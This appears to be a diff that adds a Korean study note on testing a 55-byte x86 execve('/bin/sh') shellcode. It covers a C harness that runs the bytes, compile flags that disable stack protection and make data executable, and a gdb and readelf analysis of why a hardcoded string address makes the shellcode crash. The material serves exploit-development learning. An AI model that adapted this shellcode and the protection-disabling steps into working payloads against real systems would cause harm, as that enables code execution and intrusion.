@@ -1,0 +1,361 @@
+
+* 앞서 생성한 55 bytes의 shell code를 이용하여 shell이 실행되는지 테스트 - execute_shell_code.c
+
+char shellcode[] = 
+"\xbe\x6f\x88\x04\x08\xc6\x46\x07\x00\x89\x76\x08\xc7\x46\x0c\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\xba\x00\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\x2f\x62\x69\x6e\x2f\x73\x68";
+
+void main()
+{
+	void(*func)() = (void(*)())shellcode;
+	func();
+}
+
+1. gcc compiler는 위 코드에서 전역변수로 초기화되어 있는 shellcode 배열을 .data section에 문자열로 저장한다.
+2. 코드가 실행되면, data segment는 기본적으로 execute 권한이 없기 때문에(rw-p), func()이 호출되어도 shell code가 실행되지 않는 문제점이 존재한다. 
+3. data segment의 execute를 허용하기 위해 compile 옵션인 -Wl,-z,execstack 옵션을 추가한다.
+   1) -Wl,option : gcc linking option 의미
+   2) -Wl과 option 사이의 ,는 반드시 필요하며 띄어쓰면 안됨 - syntax
+   3) -z,execstack : stack에 execute 권한을 부여하는 옵션으로 stack 뿐만 아니라 data / bss / heap 모든 segment에 execute 권한을 부여한다.
+
+
+* -Wl,-z,execstack 링킹 옵션을 적용하지 않는 경우
+
+guybrush@nt900x5t:~/Project/github/hack/shellcode/step1/x86$ gcc -o execute_shell_code execute_shell_code.c -m32 -fno-stack-protector -mpreferred-stack-boundary=2
+guybrush@nt900x5t:~/Project/github/hack/shellcode/step1/x86$ readelf -l execute_shell_code
+
+Elf file type is EXEC (Executable file)
+Entry point 0x80482e0
+There are 9 program headers, starting at offset 52
+
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
+  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
+      [Requesting program interpreter: /lib/ld-linux.so.2]
+  LOAD           0x000000 0x08048000 0x08048000 0x0055c 0x0055c R E 0x1000
+  LOAD           0x000f08 0x08049f08 0x08049f08 0x00170 0x00174 RW  0x1000
+  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
+  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
+  GNU_EH_FRAME   0x000470 0x08048470 0x08048470 0x0002c 0x0002c R   0x4
+
+"  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10"
+
+  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1
+
+ Section to Segment mapping:
+  Segment Sections...
+   00     
+   01     .interp 
+   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame 
+   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 
+   04     .dynamic 
+   05     .note.ABI-tag .note.gnu.build-id 
+   06     .eh_frame_hdr 
+   07     
+   08     .init_array .fini_array .jcr .dynamic .got 
+
+=> GNU_STACK의 Flg 필드에 RW 값이 설정되어 있으며, read / write 권한만 부여되어 있고, execute 권한이 없음을 확인할 수 있다.
+
+
+guybrush@nt900x5t:~/Project/github/hack/shellcode/step1/x86$ gdb -q execute_shell_code
+Reading symbols from execute_shell_code...(no debugging symbols found)...done.
+(gdb) start
+Temporary breakpoint 1 at 0x80483e1
+Starting program: /home/guybrush/Project/github/hack/shellcode/step1/x86/execute_shell_code 
+
+Temporary breakpoint 1, 0x080483e1 in main ()
+(gdb) shell ps -a
+  PID TTY          TIME CMD
+13922 pts/2    00:00:00 gdb
+13925 pts/2    00:00:00 execute_shell_c
+13929 pts/2    00:00:00 ps
+(gdb) shell cat /proc/13925/maps
+08048000-08049000 r-xp 00000000 103:07 1835695                           /home/guybrush/Project/github/hack/shellcode/step1/x86/execute_shell_code
+08049000-0804a000 r--p 00000000 103:07 1835695                           /home/guybrush/Project/github/hack/shellcode/step1/x86/execute_shell_code
+
+"0804a000-0804b000 rw-p 00001000 103:07 1835695                           /home/guybrush/Project/github/hack/shellcode/step1/x86/execute_shell_code"
+
+f7e04000-f7e05000 rw-p 00000000 00:00 0 
+f7e05000-f7fb2000 r-xp 00000000 103:07 3538950                           /lib32/libc-2.23.so
+f7fb2000-f7fb3000 ---p 001ad000 103:07 3538950                           /lib32/libc-2.23.so
+f7fb3000-f7fb5000 r--p 001ad000 103:07 3538950                           /lib32/libc-2.23.so
+f7fb5000-f7fb6000 rw-p 001af000 103:07 3538950                           /lib32/libc-2.23.so
+f7fb6000-f7fb9000 rw-p 00000000 00:00 0 
+f7fd4000-f7fd5000 rw-p 00000000 00:00 0 
+f7fd5000-f7fd8000 r--p 00000000 00:00 0                                  [vvar]
+f7fd8000-f7fda000 r-xp 00000000 00:00 0                                  [vdso]
+f7fda000-f7ffc000 r-xp 00000000 103:07 3538948                           /lib32/ld-2.23.so
+f7ffc000-f7ffd000 r--p 00022000 103:07 3538948                           /lib32/ld-2.23.so
+f7ffd000-f7ffe000 rw-p 00023000 103:07 3538948                           /lib32/ld-2.23.so
+
+"fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]"
+
+(gdb) 
+
+=> gdb로 실행 후 data segment와 stack segment를 보면 모두 rw-p 권한으로 execute 권한이 없음을 확인할 수 있다.
+=> 뿐만 아니라 libc-2.23.so, ld-2.23.so 의 data segment도 모두 execute 권한이 동일하게 없다. 
+
+
+
+
+* -Wl,-z,execstack 링킹 옵션을 적용한 경우
+
+guybrush@nt900x5t:~/Project/github/hack/shellcode/step1/x86$ gcc -o execute_shell_code execute_shell_code.c -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -Wl,-z,execstack
+guybrush@nt900x5t:~/Project/github/hack/shellcode/step1/x86$ readelf -l execute_shell_code
+
+Elf file type is EXEC (Executable file)
+Entry point 0x80482e0
+There are 9 program headers, starting at offset 52
+
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
+  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
+      [Requesting program interpreter: /lib/ld-linux.so.2]
+  LOAD           0x000000 0x08048000 0x08048000 0x0055c 0x0055c R E 0x1000
+  LOAD           0x000f08 0x08049f08 0x08049f08 0x00170 0x00174 RW  0x1000
+  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
+  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
+  GNU_EH_FRAME   0x000470 0x08048470 0x08048470 0x0002c 0x0002c R   0x4
+
+"  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10"
+
+  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1
+
+ Section to Segment mapping:
+  Segment Sections...
+   00     
+   01     .interp 
+   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame 
+   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 
+   04     .dynamic 
+   05     .note.ABI-tag .note.gnu.build-id 
+   06     .eh_frame_hdr 
+   07     
+   08     .init_array .fini_array .jcr .dynamic .got 
+
+=> GNU_STACK의 Flg 필드에 RWE 값이 설정되어 있으며, read / write / execute 권한이 모두 부여되어 있음을 확인할 수 있다.
+
+
+guybrush@nt900x5t:~/Project/github/hack/shellcode/step1/x86$ gdb -q execute_shell_code
+Reading symbols from execute_shell_code...(no debugging symbols found)...done.
+(gdb) start
+Temporary breakpoint 1 at 0x80483e1
+Starting program: /home/guybrush/Project/github/hack/shellcode/step1/x86/execute_shell_code 
+
+Temporary breakpoint 1, 0x080483e1 in main ()
+(gdb) shell ps -a
+  PID TTY          TIME CMD
+14041 pts/2    00:00:00 gdb
+14045 pts/2    00:00:00 execute_shell_c
+14050 pts/2    00:00:00 ps
+(gdb) shell cat /proc/14045/maps
+08048000-08049000 r-xp 00000000 103:07 1835695                           /home/guybrush/Project/github/hack/shellcode/step1/x86/execute_shell_code
+08049000-0804a000 r-xp 00000000 103:07 1835695                           /home/guybrush/Project/github/hack/shellcode/step1/x86/execute_shell_code
+
+"0804a000-0804b000 rwxp 00001000 103:07 1835695                           /home/guybrush/Project/github/hack/shellcode/step1/x86/execute_shell_code"
+
+f7e04000-f7e05000 rwxp 00000000 00:00 0 
+f7e05000-f7fb2000 r-xp 00000000 103:07 3538950                           /lib32/libc-2.23.so
+f7fb2000-f7fb3000 ---p 001ad000 103:07 3538950                           /lib32/libc-2.23.so
+f7fb3000-f7fb5000 r-xp 001ad000 103:07 3538950                           /lib32/libc-2.23.so
+f7fb5000-f7fb6000 rwxp 001af000 103:07 3538950                           /lib32/libc-2.23.so
+f7fb6000-f7fb9000 rwxp 00000000 00:00 0 
+f7fd4000-f7fd5000 rwxp 00000000 00:00 0 
+f7fd5000-f7fd8000 r--p 00000000 00:00 0                                  [vvar]
+f7fd8000-f7fda000 r-xp 00000000 00:00 0                                  [vdso]
+f7fda000-f7ffc000 r-xp 00000000 103:07 3538948                           /lib32/ld-2.23.so
+f7ffc000-f7ffd000 r-xp 00022000 103:07 3538948                           /lib32/ld-2.23.so
+f7ffd000-f7ffe000 rwxp 00023000 103:07 3538948                           /lib32/ld-2.23.so
+
+"fffdd000-ffffe000 rwxp 00000000 00:00 0                                  [stack]"
+
+(gdb) 
+
+
+=> gdb로 실행 후 data segment와 stack segment를 보면 모두 rwxp 권한으로 execute 권한이 부여되어 있음을 확인할 수 있다.
+=> 뿐만 아니라 libc-2.23.so, ld-2.23.so 의 data segment도 모두 execute 권한이 동일하게 부여되어 있다. 
+
+
+
+
+* -z,execstack 옵션 적용 후 compile 및 실행 테스트
+guybrush@nt900x5t:~/Project/github/hack/shellcode/step1/x86$ gcc -o execute_shell_code execute_shell_code.c -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -Wl,-z,execstack
+
+guybrush@nt900x5t:~/Project/github/hack/shellcode/step1/x86$ ./execute_shell_code 
+Segmentation fault (core dumped)
+
+=> data segment에 실행권한도 부여했지만, segmentation fault가 발생한다. 이유는?
+
+
+
+* segmentation fault 원인분석
+
+guybrush@nt900x5t:~/Project/github/hack/shellcode/step1/x86$ gcc -o execute_shell_code execute_shell_code.c -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -Wl,-z,execstack
+guybrush@nt900x5t:~/Project/github/hack/shellcode/step1/x86$ gdb -q execute_shell_code
+Reading symbols from execute_shell_code...(no debugging symbols found)...done.
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x080483db <+0>:	push   ebp
+   0x080483dc <+1>:	mov    ebp,esp
+   0x080483de <+3>:	sub    esp,0x4
+   0x080483e1 <+6>:	mov    DWORD PTR [ebp-0x4],0x804a040
+   0x080483e8 <+13>:	mov    eax,DWORD PTR [ebp-0x4]
+   0x080483eb <+16>:	call   eax
+   0x080483ed <+18>:	nop
+   0x080483ee <+19>:	leave  
+   0x080483ef <+20>:	ret    
+End of assembler dump.
+
+=> gdb로 실행해보면, call eax 부분이 위의 c 코드에서 func() 호출부분 즉, shellcode를 호출하는 부분임을 알 수 있다.
+   해당 위치에 break를 걸고 실행해 본다.
+
+
+(gdb) b *main+16
+Breakpoint 1 at 0x80483eb
+(gdb) r
+Starting program: /home/guybrush/Project/github/hack/shellcode/step1/x86/execute_shell_code 
+
+Breakpoint 1, 0x080483eb in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x080483db <+0>:	push   ebp
+   0x080483dc <+1>:	mov    ebp,esp
+   0x080483de <+3>:	sub    esp,0x4
+   0x080483e1 <+6>:	mov    DWORD PTR [ebp-0x4],0x804a040
+   0x080483e8 <+13>:	mov    eax,DWORD PTR [ebp-0x4]
+=> 0x080483eb <+16>:	call   eax
+   0x080483ed <+18>:	nop
+   0x080483ee <+19>:	leave  
+   0x080483ef <+20>:	ret    
+End of assembler dump.
+
+=> eax 레지스터의 shellcode의 주소가 저장되어 있으므로, 우리가 입력한 55 bytes의 shellcode가 정상적으로 로딩되어 있는지 확인한다.
+
+
+(gdb) x/55bx $eax
+0x804a040 <shellcode>:	0xbe	0x6f	0x88	0x04	0x08	0xc6	0x46	0x07
+0x804a048 <shellcode+8>:	0x00	0x89	0x76	0x08	0xc7	0x46	0x0c	0x00
+0x804a050 <shellcode+16>:	0x00	0x00	0x00	0xb8	0x0b	0x00	0x00	0x00
+0x804a058 <shellcode+24>:	0x89	0xf3	0x8d	0x4e	0x08	0xba	0x00	0x00
+0x804a060 <shellcode+32>:	0x00	0x00	0xcd	0x80	0xb8	0x01	0x00	0x00
+0x804a068 <shellcode+40>:	0x00	0xbb	0x00	0x00	0x00	0x00	0xcd	0x80
+0x804a070 <shellcode+48>:	0x2f	0x62	0x69	0x6e	0x2f	0x73	0x68
+
+=> 정확하게 55 bytes의 shellcode가 eax 레지스터에 저장된 주소에 위치하고 있다.
+
+=> shellcode로 진입 후 (call eax), assembly code를 확인해 보면, 앞서 shell code를 만들기 위해 작성한 assembly code와 동일함을 확인할 수 있다.
+
+(gdb) si
+0x0804a040 in shellcode ()
+(gdb) disassemble 
+Dump of assembler code for function shellcode:
+=> 0x0804a040 <+0>:	mov    esi,0x804886f
+   0x0804a045 <+5>:	mov    BYTE PTR [esi+0x7],0x0
+   0x0804a049 <+9>:	mov    DWORD PTR [esi+0x8],esi
+   0x0804a04c <+12>:	mov    DWORD PTR [esi+0xc],0x0
+   0x0804a053 <+19>:	mov    eax,0xb
+   0x0804a058 <+24>:	mov    ebx,esi
+   0x0804a05a <+26>:	lea    ecx,[esi+0x8]
+   0x0804a05d <+29>:	mov    edx,0x0
+   0x0804a062 <+34>:	int    0x80
+   0x0804a064 <+36>:	mov    eax,0x1
+   0x0804a069 <+41>:	mov    ebx,0x0
+   0x0804a06e <+46>:	int    0x80
+   0x0804a070 <+48>:	das    
+   0x0804a071 <+49>:	bound  ebp,QWORD PTR [ecx+0x6e]
+   0x0804a074 <+52>:	das    
+   0x0804a075 <+53>:	jae    0x804a0df
+   0x0804a077 <+55>:	add    BYTE PTR [eax],al
+End of assembler dump.
+(gdb) x/55bx $eax
+0x804a040 <shellcode>:	0xbe	0x6f	0x88	0x04	0x08	0xc6	0x46	0x07
+0x804a048 <shellcode+8>:	0x00	0x89	0x76	0x08	0xc7	0x46	0x0c	0x00
+0x804a050 <shellcode+16>:	0x00	0x00	0x00	0xb8	0x0b	0x00	0x00	0x00
+0x804a058 <shellcode+24>:	0x89	0xf3	0x8d	0x4e	0x08	0xba	0x00	0x00
+0x804a060 <shellcode+32>:	0x00	0x00	0xcd	0x80	0xb8	0x01	0x00	0x00
+0x804a068 <shellcode+40>:	0x00	0xbb	0x00	0x00	0x00	0x00	0xcd	0x80
+0x804a070 <shellcode+48>:	0x2f	0x62	0x69	0x6e	0x2f	0x73	0x68
+
+=> 여기서 문제가 발생하는데,
+   assembly code의 첫번째 코드인 mov esi, 0x804886f는 label에 저장한 /bin/sh 문자열 주소를 esi 레지스터에 저장하는 코드로써,
+   label의 값 즉, /bin/sh 문자열의 주소로 0x804886f가 사용되고 있는데,
+   이 주소는 shell code 작성을 위해 사용한 이전 program(asm_shell_x86_intel or asm_shell_x86_atnt)에서 사용했던 주소이다.
+
+=> 실제로 현재 program(execute_shell_code)에서 /bin/sh 문자열의 주소를 확인해보면,
+
+(gdb) x/s 0x0804a070
+0x804a070 <shellcode+48>:	"/bin/sh"
+
+=> 참고로, execute_shell_code에서의 /bin/sh 문자열 주소는 shell code 의 마지막에 입력된 /bin/sh 코드가 저장된 주소인 0x0804a070임을 알 수 있다.
+
+0x804a070 <shellcode+48>:	0x2f	0x62	0x69	0x6e	0x2f	0x73	0x68 	=> /bin/sh
+
+(gdb) x/s 0x0804886f
+0x804886f:	""
+
+=> 0x0804a070이며, 위의 shellcode에 입력된 0x0804886f에는 empty string이 들어가 있음을 확인할 수 있다.
+
+=> 즉, asm_shell_x86_intel or asm_shell_x86_atnt에서 사용했던 /bin/sh 문자열의 주소(0x0804886f)가 shellcode에 하드코딩되면서,
+   다른 program(execute_shell_code)에서는 사용할 수 없게 되는 결과를 초래하게 된다.
+
+
+(gdb) shell readelf -S execute_shell_code
+There are 31 section headers, starting at offset 0x1840:
+
+Section Headers:
+  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
+  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
+  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
+  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
+  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
+  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4
+  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000040 10   A  6   1  4
+  [ 6] .dynstr           STRTAB          0804820c 00020c 000045 00   A  0   0  1
+  [ 7] .gnu.version      VERSYM          08048252 000252 000008 02   A  5   0  2
+  [ 8] .gnu.version_r    VERNEED         0804825c 00025c 000020 00   A  6   1  4
+  [ 9] .rel.dyn          REL             0804827c 00027c 000008 08   A  5   0  4
+  [10] .rel.plt          REL             08048284 000284 000008 08  AI  5  24  4
+  [11] .init             PROGBITS        0804828c 00028c 000023 00  AX  0   0  4
+  [12] .plt              PROGBITS        080482b0 0002b0 000020 04  AX  0   0 16
+  [13] .plt.got          PROGBITS        080482d0 0002d0 000008 00  AX  0   0  8
+  [14] .text             PROGBITS        080482e0 0002e0 000172 00  AX  0   0 16
+  [15] .fini             PROGBITS        08048454 000454 000014 00  AX  0   0  4
+  [16] .rodata           PROGBITS        08048468 000468 000008 00   A  0   0  4
+  [17] .eh_frame_hdr     PROGBITS        08048470 000470 00002c 00   A  0   0  4
+  [18] .eh_frame         PROGBITS        0804849c 00049c 0000c0 00   A  0   0  4
+  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
+  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
+  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
+  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
+  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
+  [24] .got.plt          PROGBITS        0804a000 001000 000010 04  WA  0   0  4
+  [25] .data             PROGBITS        0804a020 001020 000058 00  WA  0   0 32
+  [26] .bss              NOBITS          0804a078 001078 000004 00  WA  0   0  1
+  [27] .comment          PROGBITS        00000000 001078 000035 01  MS  0   0  1
+  [28] .shstrtab         STRTAB          00000000 001734 00010a 00      0   0  1
+  [29] .symtab           SYMTAB          00000000 0010b0 000450 10     30  47  4
+  [30] .strtab           STRTAB          00000000 001500 000234 00      0   0  1
+Key to Flags:
+  W (write), A (alloc), X (execute), M (merge), S (strings)
+  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
+  O (extra OS processing required) o (OS specific), p (processor specific)
+(gdb) 
+
+
+=> execute_shell_code program에서의 /bin/sh 문자열 주소는 위에서 확인한바와 같이 0x0804a070인데,
+   이 주소는 data section 영역의 주소임을 확인할 수 있다.
+=> 반면, shellcode에 하드코딩된 /bin/sh의 주소인 0x0804886f는 execute_shell_code program에서 .eh_frame section 영역임을 확인할 수 있다.
+
+=> 즉, 실제 /bin/sh 문자열이 존재하지도 않는 예상치 못한 section의 코드를 참조하게 되어 정상적인 shell code 실행이 불가하다.
+
+=> 결과적으로,
+   shell code 추출시에 /bin/sh 문자열의 시작 주소값을 label을 통해 설정할 경우 주소값이 고정되어 shellcode에 하드코딩되면서,
+   다른 program에서는 사용을 할 수가 없게 되는 문제점이 존재한다.
+
+
+
+
+
+
+
